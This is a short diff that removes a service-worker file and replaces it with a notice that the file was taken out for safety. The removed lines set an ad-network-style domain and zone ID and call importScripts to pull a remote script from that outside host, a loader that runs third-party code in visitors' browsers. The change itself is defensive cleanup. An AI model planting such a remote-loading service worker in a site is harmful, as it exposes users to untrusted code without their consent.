@@ -1,6 +1,6 @@
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 11654436
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+# REMOVED: /222
+
+This file was replaced on branch remove-untrusted-files for safety reasons.
+Original file was removed from precache because it referenced untrusted or external scripts.
+
+If you need the original content for investigation, retrieve it from the repository history before merging this change.
